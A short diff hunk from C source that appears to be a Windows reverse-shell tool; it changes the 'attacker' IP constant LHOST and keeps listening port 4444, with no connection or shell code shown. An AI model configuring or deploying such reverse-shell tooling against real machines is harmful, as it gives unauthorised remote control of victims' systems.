@@ -7,7 +7,7 @@
 #define MAX_COMMAND_LENGTH 1024
 
 // Server (attacker) information
-#define LHOST "192.168.1.100"  // Attacker's IP address (change as necessary)
+#define LHOST "10.0.1.35"  // Attacker's IP address (change as necessary)
 #define LPORT 4444             // Attacker's listening port (change as necessary)
 
 // Initialize Winsock (on Windows systems)
